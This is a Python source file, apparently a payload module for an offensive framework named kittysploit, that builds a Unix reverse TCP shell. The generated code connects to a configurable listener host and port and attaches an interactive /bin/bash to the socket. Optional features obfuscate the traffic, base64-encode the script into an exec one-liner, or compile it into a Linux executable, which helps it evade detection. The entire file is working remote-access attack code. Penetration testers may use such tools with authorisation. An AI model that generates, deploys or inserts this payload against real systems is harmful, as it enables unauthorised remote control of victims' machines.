from kittysploit import *


class Module(Payload):

	CLIENT_LANGUAGE = "python"

	__info__ = {
			'name': 'Unix Command Shell, Reverse TCP (via Python)',
			'description': 'Connect back and create a command shell via Python (Linux/Unix only; use singles/cmd/windows/python_reverse_tcp on Windows)',
			'category': 'singles',
			'arch': Arch.PYTHON,
			'listener': 'listeners/multi/reverse_tcp',
			'handler': Handler.REVERSE
		}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(5555, 'Bind Port', True)
	shell_binary = OptString('/bin/bash', 'The system shell in use', True, True)
	python_binary = OptString("python3", "Python binary version", True)
	encoder = OptString("", "Encoder", False, True)
	compile_exe = OptBool(False, "Compile to EXE (requires Zig)", False, True)
	output_path = OptString("", "Output path when compile_exe=true (default: payload)", False, True)

	def _build_script(self, host: str, port: int, shell: str, obf_client_code: str = None) -> str:
		"""Build the Python script (used by generate and get_python_script)."""
		if obf_client_code:
			on_connect = "_obf_send_client_hello(s)\n" if "_obf_send_client_hello" in obf_client_code else ""
			return (
				"import socket,subprocess,threading\n"
				+ obf_client_code + "\n"
				+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
				+ f"s.connect(('{host}',{port}))\n"
				+ on_connect
				+ f"p=subprocess.Popen(['{shell}','-i'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
				"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_obf_decode(d)); p.stdin.flush()\n"
				"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_obf_encode(buf)); buf=b''\n if buf: s.sendall(_obf_encode(buf))\n"
				"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
			)
		return f"import socket,subprocess,os;host='{host}';port={port};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['{shell}','-i'])"

	def get_python_script(self):
		"""Return raw Python script for compilation to EXE."""
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell_binary).replace("'", "'\"'\"'")
		obf = self._get_obfuscator_instance()
		obf_code = None
		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
			obf_code = obf.generate_client_code(self._get_client_language())
		return self._build_script(host, port, shell, obf_code)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell_binary).replace("'", "'\"'\"'")
		py = str(self.python_binary)

		obf = self._get_obfuscator_instance()
		obf_code = None
		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
			obf_code = obf.generate_client_code(self._get_client_language())
		if obf and not self._is_obfuscator_compatible(obf):
			from core.output_handler import print_warning
			lang = self._get_client_language() or "?"
			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
			print_warning(f"Obfuscator does not support client language '{lang}' for this payload (supported: {supported}). Generating without obfuscation.")

		script = self._build_script(host, port, shell, obf_code)

		# Compile to EXE if requested
		if self.compile_exe:
			import os
			out = (self.output_path or "").strip()
			if not out:
				out = os.path.join("output", f"payload_{host}_{port}")
			out = os.path.abspath(out)
			if self.compile_python_to_exe(output_path=out, target_platform='linux'):
				return out
			from core.output_handler import print_warning
			print_warning("EXE compilation failed, falling back to Python command")

		if obf_code:
			import base64 as b64
			encoded = b64.b64encode(script.encode("utf-8")).decode("ascii")
			return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
		return f"{py} -c \"{script}\""